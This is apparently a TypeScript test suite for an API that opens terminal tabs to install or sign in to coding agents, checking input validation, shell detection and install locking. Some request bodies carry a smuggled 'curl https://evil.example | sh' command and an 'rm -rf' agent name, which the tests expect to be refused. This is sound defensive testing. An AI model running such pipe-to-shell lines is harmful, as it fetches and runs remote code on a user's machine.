import { afterAll, afterEach, beforeAll, describe, expect, it, spyOn } from "bun:test";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { AGENT_CATALOG } from "../shared/agent-catalog.ts";
import { AgentDetector } from "./agent-catalog-detect.ts";
import { AgentInstaller } from "./agent-catalog-install.ts";
import * as herdr from "./herdr/client.ts";
import { createServer } from "./index.ts";
import { handleMachineRequest } from "./machine-api.ts";
import type { MachineManager } from "./machines.ts";

const WATCH_TOKEN = "w".repeat(64);
const BRIDGE_TOKEN = "b".repeat(64);
const claude = AGENT_CATALOG.find((entry) => entry.id === "claude")!;
const code = async (response: Response | null) => [response!.status, ((await response!.json()) as { error: { code: string } }).error.code];
/**
 * Time that moves only when told to. `advance(count)` waits for the code under test to start
 * `count` new sleeps since the last advance (it is then waiting), moves to the earliest pending one
 * and ends it.
 */
type VirtualClock = ReturnType<typeof virtualClock>;
function virtualClock() {
  let time = 0;
  let started = 0;
  const timers: { at: number; wake: () => void }[] = [];
  let changed = () => {};
  return {
    now: () => time,
    pending: () => timers.length,
    sleep(ms: number, signal?: AbortSignal): Promise<void> {
      return new Promise((wake) => {
        const timer = { at: time + ms, wake };
        timers.push(timer);
        started++;
        signal?.addEventListener("abort", () => { const at = timers.indexOf(timer); if (at >= 0) timers.splice(at, 1); }, { once: true });
        changed();
      });
    },
    async advance(count: number): Promise<void> {
      while (started < count) await new Promise<void>((resolve) => { changed = resolve; });
      started = 0;
      timers.sort((a, b) => a.at - b.at);
      const next = timers.shift()!;
      time = next.at;
      next.wake();
    },
  };
}
const post = (path: string, body: unknown) => new Request(`http://127.0.0.1${path}`, { method: "POST", body: JSON.stringify(body), headers: { "content-type": "application/json" } });

describe("POST /api/agent-catalog/install and /sign-in", () => {
  // the new tab's pane is gone by the time anyone asks, unless a test says it is still open
  const openPanes: string[] = [];
  const snapshot = spyOn(herdr, "sessionSnapshot").mockImplementation(async () => ({ workspaces: [{ workspace_id: "w1" }], panes: openPanes.map((pane_id) => ({ pane_id })) }) as never);
  const tab = spyOn(herdr, "tabCreate").mockImplementation(async () => ({ root_pane: { pane_id: "w1:p9" }, tab: { tab_id: "w1:t9", workspace_id: "w1" } }) as never);
  const closed = spyOn(herdr, "tabClose").mockImplementation(async () => undefined);
  const typed = spyOn(herdr, "paneSendText").mockImplementation(async () => undefined);
  const keys = spyOn(herdr, "paneSendKeys").mockImplementation(async () => undefined);
  const pwsh = async () => ({ foreground_processes: [{ argv: ["C:\\Program Files\\PowerShell\\7\\pwsh.exe"] }] }) as never;
  const info = spyOn(herdr, "paneProcessInfo").mockImplementation(pwsh);
  const nowhere = new AgentDetector({ locate: async () => null, home: "/nonexistent", env: {} });
  const found = new AgentDetector({ locate: async (binary) => `/opt/agents/${binary}`, home: "/nonexistent", env: {} });

  afterEach(() => { openPanes.length = 0; info.mockImplementation(pwsh); for (const spy of [snapshot, tab, closed, typed, keys, info]) spy.mockClear(); });
  afterAll(() => { for (const spy of [snapshot, tab, closed, typed, keys, info]) spy.mockRestore(); });

  it("opens a tab and types the catalog's own command for this platform, never one from the request", async () => {
    const installer = new AgentInstaller(nowhere, "linux", "/home/user");
    const response = await installer.handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install");
    expect(response!.status).toBe(200);
    expect(await response!.json()).toEqual({ pane_id: "w1:p9", workspace_id: "w1", command: claude.install.linux!.primary.command, shell: "posix" });
    expect(tab.mock.calls[0]![0]).toMatchObject({ workspaceId: "w1", cwd: "/home/user", label: "Install Claude Code" });
    expect(typed.mock.calls).toEqual([["w1:p9", `${claude.install.linux!.primary.command}\n`]]);
    const brew = await installer.handle(post("/api/agent-catalog/install", { agent: "claude", alternative: 0 }), "/api/agent-catalog/install");
    expect(((await brew!.json()) as { command: string }).command).toBe(claude.install.linux!.alternatives[0]!.command);
  });

  it("refuses a field it does not take, such as a command or a platform, opening no tab", async () => {
    const installer = new AgentInstaller(found, "linux");
    const bodies: [string, Record<string, unknown>][] = [
      ["/api/agent-catalog/install", { agent: "claude", command: "curl https://evil.example | sh" }],
      ["/api/agent-catalog/install", { agent: "claude", platform: "windows" }],
      ["/api/agent-catalog/install", { agent: "claude", alternative: 0, extra: true }],
      ["/api/agent-catalog/sign-in", { agent: "claude", command: "curl https://evil.example | sh" }],
      ["/api/agent-catalog/sign-in", { agent: "claude", alternative: 0 }],
    ];
    for (const [path, body] of bodies) expect([path, ...(await code(await installer.handle(post(path, body), path)))]).toEqual([path, 400, "unknown_field"]);
    expect(tab).not.toHaveBeenCalled();
    expect(typed).not.toHaveBeenCalled();
  });

  it("on Windows, waits for herdr to name the new tab's shell, and types into it once named", async () => {
    // a new tab's shell is not in front at once: herdr names nothing, then PowerShell
    const answers: unknown[] = [null, { foreground_processes: [] }];
    info.mockImplementation(async () => (answers.length > 0 ? answers.shift() : await pwsh()) as never);
    const response = await new AgentInstaller(nowhere, "windows", undefined, { shellWaitMs: 5_000 }).handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install");
    expect(response!.status).toBe(200);
    expect(info).toHaveBeenCalledTimes(3);
    expect(typed.mock.calls).toEqual([["w1:p9", claude.install.windows!.primary.command]]);
  });

  it("on Windows, closes the new tab when reading its shell fails, and lets the next install start", async () => {
    for (const [path, detector] of [["/api/agent-catalog/install", nowhere], ["/api/agent-catalog/sign-in", found]] as const) {
      info.mockImplementationOnce(async () => { throw new herdr.HerdrError("timeout", "herdr did not answer"); });
      const installer = new AgentInstaller(detector, "windows", undefined, { shellWaitMs: 5_000 });
      const failed = await installer.handle(post(path, { agent: "claude" }), path);
      expect([path, failed!.status]).toEqual([path, 502]);
      expect(closed.mock.calls).toEqual([["w1:t9"]]);
      expect(typed).not.toHaveBeenCalled();
      expect((await installer.handle(post(path, { agent: "claude" }), path))!.status).toBe(200);
      closed.mockClear();
      typed.mockClear();
    }
  });

  it("on Windows, gives the new tab's shell one overall deadline, not one per answer", async () => {
    const install = (clock: VirtualClock, shellWaitMs: number) => new AgentInstaller(nowhere, "windows", undefined, { shellWaitMs, clock }).handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install");
    // herdr takes 300 ms per answer: nothing named at first, then PowerShell, which would come at 600 ms
    const slow = virtualClock();
    let answers = 0;
    info.mockImplementation(async () => { await slow.sleep(300); return (answers++ === 0 ? null : await pwsh()) as never; });
    const first = install(slow, 500);
    await slow.advance(2); // the answer (300 ms) and the deadline (500 ms) start: the answer comes first
    await slow.advance(1); // the pause before asking again starts, and ends at the deadline
    expect(await code(await first)).toEqual([409, "shell_unknown"]);
    expect([slow.now(), answers]).toEqual([500, 1]);
    // one answer that would come at 800 ms is not waited for past a 300 ms deadline
    const late = virtualClock();
    info.mockImplementation(async () => { await late.sleep(800); return await pwsh(); });
    const second = install(late, 300);
    await late.advance(2);
    expect(await code(await second)).toEqual([409, "shell_unknown"]);
    expect([late.now(), late.pending()]).toEqual([300, 1]);
    expect(typed).not.toHaveBeenCalled();
    expect(closed).toHaveBeenCalledTimes(2);
  });

  it("on Windows, types nothing into a tab whose shell herdr never names, or names as another shell, and closes that tab", async () => {
    for (const reported of [null, { foreground_processes: [{ argv: ["C:\\tools\\nu.exe"] }] }]) {
      info.mockImplementation(async () => reported as never);
      expect(await code(await new AgentInstaller(nowhere, "windows", undefined, { shellWaitMs: 0 }).handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install"))).toEqual([409, "shell_unknown"]);
      expect(await code(await new AgentInstaller(found, "windows", undefined, { shellWaitMs: 0 }).handle(post("/api/agent-catalog/sign-in", { agent: "claude" }), "/api/agent-catalog/sign-in"))).toEqual([409, "shell_unknown"]);
    }
    expect(typed).not.toHaveBeenCalled();
    expect(keys).not.toHaveBeenCalled();
    expect(closed.mock.calls).toEqual(Array.from({ length: 4 }, () => ["w1:t9"]));
  });

  describe("one install of an agent at a time, for as long as its installer runs", () => {
    const shellPid = 100;
    const shell = [{ pid: shellPid, argv: ["/bin/bash"] }];
    const installerRunning = [{ pid: 201, argv: ["curl", "-fsSL", "https://claude.ai/install.sh"] }, { pid: 202, argv: ["bash"] }];
    let front: { pid: number; argv: string[] }[] = shell;
    const follow = () => info.mockImplementation(async () => ({ shell_pid: shellPid, foreground_processes: front }) as never);
    const installOf = (installer: AgentInstaller, agent = "claude") => installer.handle(post("/api/agent-catalog/install", { agent }), "/api/agent-catalog/install");

    it("holds it while the installer runs, even once the agent is found, and releases it when the tab is back at its shell", async () => {
      let placed = false;
      const detector = new AgentDetector({ locate: async (binary) => placed ? `/opt/agents/${binary}` : null, home: "/nonexistent", env: {} });
      const installer = new AgentInstaller(detector, "linux", undefined, { startWindowMs: 60_000 });
      front = shell;
      follow();
      openPanes.push("w1:p9");
      const both = await Promise.all([installOf(installer), installOf(installer)]);
      expect(both.map((response) => response!.status).sort()).toEqual([200, 409]);
      expect(await code(both.find((response) => response!.status === 409)!)).toEqual([409, "install_running"]);
      front = installerRunning;
      expect(await code(await installOf(installer))).toEqual([409, "install_running"]);
      // the installer put the agent in place before it finished: still held
      placed = true;
      expect(await code(await installOf(installer))).toEqual([409, "install_running"]);
      // another agent is not held up
      expect((await installOf(installer, "codex"))!.status).toBe(200);
      // the installer exited, its tab still open at the shell: released at once
      front = shell;
      expect((await installOf(installer))!.status).toBe(200);
      expect(tab).toHaveBeenCalledTimes(3);
    });

    it("releases an install whose installer is not seen running within the start window, and one whose tab closed", async () => {
      front = shell;
      follow();
      openPanes.push("w1:p9");
      // typed a moment ago: its installer may not be in front yet
      const waiting = new AgentInstaller(nowhere, "linux", undefined, { startWindowMs: 60_000 });
      expect((await installOf(waiting))!.status).toBe(200);
      expect(await code(await installOf(waiting))).toEqual([409, "install_running"]);
      // a failed command that never ran a program: released once the window is over
      const over = new AgentInstaller(nowhere, "linux", undefined, { startWindowMs: 0 });
      expect((await installOf(over))!.status).toBe(200);
      expect((await installOf(over))!.status).toBe(200);
      // the tab closed while the installer ran
      front = installerRunning;
      expect(await code(await installOf(waiting))).toEqual([409, "install_running"]);
      openPanes.length = 0;
      expect((await installOf(waiting))!.status).toBe(200);
    });

    it("releases an install still running past the overall cap", async () => {
      front = installerRunning;
      follow();
      openPanes.push("w1:p9");
      const capped = new AgentInstaller(nowhere, "linux", undefined, { startWindowMs: 60_000, capMs: 0 });
      expect((await installOf(capped))!.status).toBe(200);
      expect((await installOf(capped))!.status).toBe(200);
    });

    it("on Windows, holds it while the tab's shell has a program running under it, and releases it once none is", async () => {
      info.mockImplementation(async () => ({ shell_pid: shellPid, foreground_processes: [{ pid: shellPid, argv: ["C:\\Program Files\\PowerShell\\7\\pwsh.exe"] }] }) as never);
      const other = { pid: 7, parent: 1, path: "C:\\Windows\\explorer.exe", commandLine: "explorer.exe" };
      let rows = [other];
      const installer = new AgentInstaller(nowhere, "windows", undefined, { startWindowMs: 60_000, processTable: async () => rows });
      openPanes.push("w1:p9");
      expect((await installOf(installer))!.status).toBe(200);
      rows = [other, { pid: 300, parent: shellPid, path: "C:\\Users\\u\\.local\\bin\\claude.exe", commandLine: "claude.exe install" }];
      expect(await code(await installOf(installer))).toEqual([409, "install_running"]);
      rows = [other];
      expect((await installOf(installer))!.status).toBe(200);
    });
  });

  it("refuses an unknown agent, a missing command, a bad alternative and another shell's command, typing nothing", async () => {
    const installer = new AgentInstaller(nowhere, "linux");
    expect(await code(await installer.handle(post("/api/agent-catalog/install", { agent: "rm -rf" }), "/api/agent-catalog/install"))).toEqual([400, "unknown_agent"]);
    expect(await code(await installer.handle(post("/api/agent-catalog/install", { agent: "muse" }), "/api/agent-catalog/install"))).toEqual([409, "no_install_command"]);
    expect(await code(await installer.handle(post("/api/agent-catalog/install", { agent: "claude", alternative: 9 }), "/api/agent-catalog/install"))).toEqual([400, "invalid_alternative"]);
    // on Windows the new tab runs PowerShell: Claude Code's cmd.exe command does not fit it
    const windows = new AgentInstaller(nowhere, "windows");
    const cmdIndex = claude.install.windows!.alternatives.findIndex((method) => method.shell === "cmd");
    expect(await code(await windows.handle(post("/api/agent-catalog/install", { agent: "claude", alternative: cmdIndex }), "/api/agent-catalog/install"))).toEqual([409, "shell_mismatch"]);
    expect(typed).not.toHaveBeenCalled();
    expect(closed.mock.calls).toEqual([["w1:t9"]]);
    const ok = await windows.handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install");
    expect(ok!.status).toBe(200);
    expect(typed.mock.calls).toEqual([["w1:p9", claude.install.windows!.primary.command]]);
    expect(keys.mock.calls).toEqual([["w1:p9", ["Enter"]]]);
  });

  it("signs in with the installed agent's own command, and refuses an agent that is not installed", async () => {
    const response = await new AgentInstaller(found, "linux").handle(post("/api/agent-catalog/sign-in", { agent: "claude" }), "/api/agent-catalog/sign-in");
    expect(await response!.json()).toMatchObject({ command: "'/opt/agents/claude' 'auth' 'login'" });
    expect(tab.mock.calls[0]![0]).toMatchObject({ label: "Sign in to Claude Code" });
    const missing = await new AgentInstaller(nowhere, "linux").handle(post("/api/agent-catalog/sign-in", { agent: "claude" }), "/api/agent-catalog/sign-in");
    expect([missing!.status, ((await missing!.json()) as { error: { code: string } }).error.code]).toEqual([409, "not_installed"]);
  });

  it("signs in to DeepSeek Harness by starting dsh-tui itself, and only once dsh, which it needs, is there too", async () => {
    const response = await new AgentInstaller(found, "linux").handle(post("/api/agent-catalog/sign-in", { agent: "dsh-tui" }), "/api/agent-catalog/sign-in");
    expect(await response!.json()).toMatchObject({ command: "'/opt/agents/dsh-tui'" });
    const tuiOnly = new AgentDetector({ locate: async (binary) => binary === "dsh-tui" ? "/opt/agents/dsh-tui" : null, home: "/nonexistent", env: {} });
    tab.mockClear();
    const missing = await new AgentInstaller(tuiOnly, "linux").handle(post("/api/agent-catalog/sign-in", { agent: "dsh-tui" }), "/api/agent-catalog/sign-in");
    expect([missing!.status, ((await missing!.json()) as { error: { code: string } }).error.code]).toEqual([409, "not_installed"]);
    expect(tab).not.toHaveBeenCalled();
  });

  describe("through the server", () => {
    let server: ReturnType<typeof createServer>;
    let root: string;
    const url = (path: string) => `http://127.0.0.1:${server.port}${path}`;
    beforeAll(() => {
      root = mkdtempSync(join(tmpdir(), "ovis-install-route-"));
      const state = join(root, "state");
      mkdirSync(state);
      writeFileSync(join(state, "devices.json"), JSON.stringify({ gate_closed_at: new Date().toISOString(), devices: [{ id: "0123456789abcdef", label: "Watch fixture", role: "watch", token_hash: createHash("sha256").update(WATCH_TOKEN).digest("hex"), created_at: new Date().toISOString(), last_seen_at: null }] }), { mode: 0o600 });
      server = createServer({ port: 0, hostname: "127.0.0.1", stateDir: state, token: "install-token", bridgeToken: BRIDGE_TOKEN, machines: false, sidecar: false, tailscaleOwner: null, agentDetector: nowhere });
    });
    afterAll(() => { server.stop(); rmSync(root, { recursive: true, force: true }); });

    it("refuses a watching device, and starts an install for another PC through the PC proxy", async () => {
      const watched = await fetch(url("/api/agent-catalog/install"), { method: "POST", body: JSON.stringify({ agent: "claude" }), headers: { cookie: `ovis_device=${WATCH_TOKEN}`, "x-forwarded-for": "100.64.0.9", origin: url("") } });
      expect([watched.status, ((await watched.json()) as { error: { code: string } }).error.code]).toEqual([403, "read_only"]);
      expect(tab).not.toHaveBeenCalled();
      const manager = { endpoint: (id: string) => id === "remote" ? { url: url(""), token: BRIDGE_TOKEN } : null, trackTerminal: () => () => {} } as unknown as MachineManager;
      const proxied = await handleMachineRequest(new Request("http://127.0.0.1/api/machines/remote/agent-catalog/install", { method: "POST", body: JSON.stringify({ agent: "codex" }), headers: { "content-type": "application/json", "x-herdr-machine": "1" } }), manager);
      expect(proxied.status).toBe(200);
      expect(((await proxied.json()) as { command: string }).command).toBeString();
      expect(tab).toHaveBeenCalledTimes(1);
      const smuggled = await handleMachineRequest(new Request("http://127.0.0.1/api/machines/remote/agent-catalog/install", { method: "POST", body: JSON.stringify({ agent: "gemini", command: "curl https://evil.example | sh" }), headers: { "content-type": "application/json", "x-herdr-machine": "1" } }), manager);
      expect(await code(smuggled)).toEqual([400, "unknown_field"]);
      expect(tab).toHaveBeenCalledTimes(1);
      expect(typed).toHaveBeenCalledTimes(1);
    });
  });
});
